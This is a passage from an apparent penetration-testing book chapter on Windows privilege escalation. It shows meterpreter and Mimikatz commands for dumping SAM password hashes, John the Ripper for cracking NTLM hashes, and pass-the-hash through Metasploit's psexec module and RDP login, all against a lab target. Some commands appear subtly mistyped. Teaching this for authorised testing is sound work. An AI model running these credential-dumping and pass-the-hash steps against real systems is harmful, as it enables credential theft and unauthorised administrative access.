					<img src="Images/B17389_07_021.jpg" alt="Figure 7.21 – Credential editor&#13;&#10;" width="979" height="599"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.21 – Credential editor</p>
			<p>In this case, we obtained all the user account hashes from the target system. We will take a look<a id="_idIndexMarker447"/> at how to utilize<a id="_idIndexMarker448"/> these hashes in the next section.</p>
			<h3>Utilizing mimikatz</h3>
			<p>We can also<a id="_idIndexMarker449"/> utilize the built-in Mimikatz <a id="_idIndexMarker450"/>meterpreter module (also known as kiwi). This can be loaded into meterpreter by running the following command:</p>
			<p class="source-code">load kiwi </p>
			<p>Once the module has been loaded, we can dump the contents of the SAM database by running the following command in the meterpreter session:</p>
			<p class="source-code">lsa_dump_sam</p>
			<p>This will output a list of all user accounts and their corresponding NTLM hashes, as shown in the following screenshot:</p>
			<div>
				<div id="_idContainer183" class="IMG---Figure">
					<img src="Images/B17389_07_022.jpg" alt="Figure 7.22 – Mimikatz hashes&#13;&#10;" width="541" height="412"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.22 – Mimikatz hashes</p>
			<p class="callout-heading">Note</p>
			<p class="callout">Mimikatz is an open source application that allows attackers to view and save Windows authentication credentials for the purpose of privilege escalation.</p>
			<p>Alternatively, you can utilize the Mimikatz executable that comes pre-packaged with Kali Linux. The binary will need to be run locally on the target system and can be automatically uploaded to the target through meterpreter by running the following command:</p>
			<p class="source-code">upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe</p>
			<p>In the event you are using a standard command shell, you can use the <strong class="source-inline">certutil</strong> utility to transfer the binary to the target system.</p>
			<p class="callout-heading">Note</p>
			<p class="callout">Mimikatz requires an elevated shell in order to dump hashes.</p>
			<p>After<a id="_idIndexMarker451"/> transferring the binary to the target system, we<a id="_idIndexMarker452"/> can execute the binary by running the following command:</p>
			<p class="source-code">.\mimikatz.exe</p>
			<p>After executing the binary, we will need elevated permissions in order to access the SAM database. This can be done by running the following commands within the Mimikatz prompt:</p>
			<p class="source-code">token::elevate</p>
			<p>We can now dump the contents of the SAM database by running the following command in the Mimikatz prompt:</p>
			<p class="source-code">lsadump_sam</p>
			<p>If successful, you should retrieve the dumped hashes from the SAM database, as highlighted in the following screenshot:</p>
			<div>
				<div id="_idContainer184" class="IMG---Figure">
					<img src="Images/B17389_07_023.jpg" alt="Figure 7.23 – Mimikatz hash dump&#13;&#10;" width="541" height="395"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.23 – Mimikatz hash dump</p>
			<p>You should now have access to various password hashes for various accounts. However, the account we are interested in is the administrator account as it will provide us with a direct route<a id="_idIndexMarker453"/> to elevate our privileges to the highest<a id="_idIndexMarker454"/> level.</p>
			<p>In the next section, we will begin the process of cracking the password hashes and learn how we can utilize the passwords for authentication.</p>
			<h1 id="_idParaDest-107"><a id="_idTextAnchor110"/>Cracking Windows hashes</h1>
			<p>We can now<a id="_idIndexMarker455"/> use the password hashes we dumped in the previous section for legitimate authentication. However, before we do that, we still need to crack these hashes to obtain the cleartext passwords. </p>
			<p>This section will be split into two main subsections. The first part will go over the process of cracking Windows password hashes with John the Ripper, while the second subsection will cover the process of authentication.</p>
			<p>Before we can begin dumping and cracking password hashes, we need to take a look at the structure of a typical Windows hash.</p>
			<p>As highlighted in the following screenshot, the hash ID is broken down into four sections:</p>
			<div>
				<div id="_idContainer185" class="IMG---Figure">
					<img src="Images/B17389_07_024.jpg" alt="Figure 7.24 – Hash structure&#13;&#10;" width="956" height="126"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.24 – Hash structure</p>
			<p>The four sections can be further classified as follows:</p>
			<ul>
				<li>The first section is the username.</li>
				<li>The second section is the unique RID.</li>
				<li>The third section is the LM hash.</li>
				<li>The fourth section is the NTLM hash.</li>
			</ul>
			<p>Now that we<a id="_idIndexMarker456"/> understand what makes up a Windows hash, we can begin the hash cracking process.</p>
			<h2 id="_idParaDest-108"><a id="_idTextAnchor111"/>Cracking Windows hashes with John the Ripper</h2>
			<p>John the <a id="_idIndexMarker457"/>Ripper is an open source<a id="_idIndexMarker458"/> password security, auditing, and recovery utility that supports a large number of hashes and ciphers. In our case, we will be utilizing John the Ripper to crack Windows NTLM hashes.</p>
			<p>John the Ripper comes pre-packaged with Kali Linux, and the first step involves saving the password hashes we dumped in the hash dumping section into a file on Kali Linux, preferably a <strong class="source-inline">.txt</strong> file.</p>
			<p>In our case, we will name the file <strong class="source-inline">hashes.txt</strong> and save the file on our <strong class="source-inline">Desktop</strong> directory on Kali Linux.</p>
			<p>The contents of your file should like similar to the following:</p>
			<div>
				<div id="_idContainer186" class="IMG---Figure">
					<img src="Images/B17389_07_025.jpg" alt="Figure 7.25 – NTLM hashes&#13;&#10;" width="905" height="410"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.25 – NTLM hashes</p>
			<p class="callout-heading">Note</p>
			<p class="callout">The NTLM hashes should not be on the same line, and no other text or strings should be included in the hash file.</p>
			<p>We can <a id="_idIndexMarker459"/>now <a id="_idIndexMarker460"/>begin the hash cracking process with John the Ripper by running the following command in Kali Linux:</p>
			<p class="source-code">sudo john –format=NT hashes.txt</p>
			<p>This will initiate the hash cracking process; any cracked hashes will be output with their corresponding password. It is important to note that, depending on the length and strength of the passwords, the cracking process may take a few minutes to a couple of hours or even days.</p>
			<p>You may also want to limit the number of hashes in the hash file to the hashes that are the most important, or even the hash for the administrator account.</p>
			<p>In this particular case, John cracked the hashes for the <strong class="source-inline">Administrator</strong> and <strong class="source-inline">vagrant</strong> user accounts, as highlighted in the following screenshot:</p>
			<div>
				<div id="_idContainer187" class="IMG---Figure">
					<img src="Images/B17389_07_026.jpg" alt="Figure 7.26 – Cracked hashes&#13;&#10;" width="847" height="212"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.26 – Cracked hashes</p>
			<p>Now that we <a id="_idIndexMarker461"/>have obtained the cleartext password<a id="_idIndexMarker462"/> for the administrator account, we can begin the authentication process.</p>
			<h2 id="_idParaDest-109"><a id="_idTextAnchor112"/>Authentication</h2>
			<p>We can use <a id="_idIndexMarker463"/>the dumped hashes and cleartext passwords to authenticate with the target to obtain privileged access. This process can be facilitated through various techniques. We will be taking a look at some of them in this subsection.</p>
			<h3>Using the pass the hash technique</h3>
			<p>The first <a id="_idIndexMarker464"/>technique we <a id="_idIndexMarker465"/>will be using is known as <em class="italic">pass the hash</em>. It involves authenticating with a target using the dumped hash – in this case, the administrator hash. This attack can be automated with a Metasploit module that leverages the <strong class="source-inline">PsExec</strong> command-line utility on Windows. This utility allows you to execute programs on remote systems.</p>
			<p>We can load the module in Metasploit after putting our meterpreter session in the background by running the following command:</p>
			<p class="source-code">use exploit/windows/smb/psexec</p>
			<p>After loading the module, we need to configure the module options. In this case, we need to configure<a id="_idIndexMarker466"/> the <strong class="source-inline">RHOSTS</strong> option and configure the <strong class="bold">Server Message Block</strong> (<strong class="bold">SMB</strong>) credentials. We set <strong class="source-inline">SMBUser</strong> to <strong class="source-inline">Administrator</strong> and the <strong class="source-inline">SMBPass</strong> option to the administrator hash, as highlighted in the following screenshot:</p>
			<div>
				<div id="_idContainer188" class="IMG---Figure">
					<img src="Images/B17389_07_027.jpg" alt="Figure 7.27 – psexec module options&#13;&#10;" width="1016" height="325"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.27 – psexec module options</p>
			<p>After configuring the module options, we can launch the module by running the following command in the Metasploit console:</p>
			<p class="source-code">run</p>
			<p>As highlighted in the following screenshot, if the module runs successfully, we should receive a <a id="_idIndexMarker467"/>meterpreter<a id="_idIndexMarker468"/> session with elevated privileges:</p>
			<div>
				<div id="_idContainer189" class="IMG---Figure">
					<img src="Images/B17389_07_028.jpg" alt="Figure 7.28 – Pass the hash was successful &#13;&#10;" width="1108" height="242"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.28 – Pass the hash was successful </p>
			<p>With that, we've successfully elevated our privileges by utilizing password hashes.</p>
			<h3>Using Remmina</h3>
			<p>During the <a id="_idIndexMarker469"/>initial Nmap scan of our target, we<a id="_idIndexMarker470"/> identified <a id="_idIndexMarker471"/>the <strong class="bold">Remote Desktop Protocol</strong> (<strong class="bold">RDP</strong>) service running on the default configured port; that is, <strong class="source-inline">3389</strong>. We can utilize the cleartext password we cracked for the administrator account to authenticate with the server and initiate a remote desktop connection with elevated privileges.</p>
			<p>This can be facilitated by using an RDP client such as Remmina, which comes pre-packaged with Kali Linux.</p>
			<p>You can launch Remmina through the application launcher menu or through the Terminal. Once you've done this, you will need to enter the target IP address, as shown in the<a id="_idIndexMarker472"/> following<a id="_idIndexMarker473"/> screenshot:</p>
			<div>
				<div id="_idContainer190" class="IMG---Figure">
					<img src="Images/B17389_07_029.jpg" alt="Figure 7.29 – Remmina IP specification&#13;&#10;" width="652" height="321"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.29 – Remmina IP specification</p>
			<p>After specifying the target IP, you will be prompted to provide credentials for authentication. In this case, we will use the administrator credentials, as shown in the following screenshot:</p>
			<div>
				<div id="_idContainer191" class="IMG---Figure">
					<img src="Images/B17389_07_030.jpg" alt="Figure 7.30 – Remmina credentials" width="518" height="329"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.30 – Remmina credentials</p>
			<p>If authentication is successful, we should receive a remote desktop session and should be logged in as the administrator account with elevated privileges, as highlighted in the following screenshot:</p>
			<div>
				<div id="_idContainer192" class="IMG---Figure">
					<img src="Images/B17389_07_031.jpg" alt="Figure 7.31 – Remmina RDP session&#13;&#10;" width="562" height="425"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.31 – Remmina RDP session</p>
			<p>With that, we've successfully elevated our privileges with the passwords hashes we dumped<a id="_idIndexMarker474"/> and <a id="_idIndexMarker475"/>cracked. </p>
			<p>You should now be familiar with the process of searching for and identifying passwords in files, as well as the process of dumping and cracking Windows NTLM hashes for the purpose of elevating privileges.</p>
			<h1 id="_idParaDest-110"><a id="_idTextAnchor113"/>Summary</h1>
			<p>In this chapter, we learned how to find and identify passwords in Windows configuration files, before looking at the various utilities that can be used to search for specific strings. We also touched on how to find and identify application passwords in configuration files, and how these credentials can be used to extend our domain of control. We ended this chapter by taking an in-depth look at how to dump Windows NTLM hashes and how to crack them to elevate our privileges.</p>
			<p>In the next chapter, we will explore the process of privilege escalation through exploiting various Windows services.</p>
		</div>
	</div></body></html>